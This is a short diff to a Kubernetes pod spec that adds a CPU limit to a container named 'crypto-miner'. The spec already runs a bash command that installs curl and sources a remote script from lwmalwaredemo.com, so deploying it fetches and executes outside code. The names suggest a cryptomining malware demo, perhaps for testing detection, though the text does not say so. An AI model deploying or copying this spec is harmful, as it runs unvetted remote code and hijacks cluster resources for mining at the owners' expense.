@@ -22,5 +22,8 @@ spec:
       containers:
       - image: ubuntu:latest
         name: crypto-miner
+        resources:
+          limits:
+            cpu: "1"
         command: ["/bin/bash"]
         args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)' ]
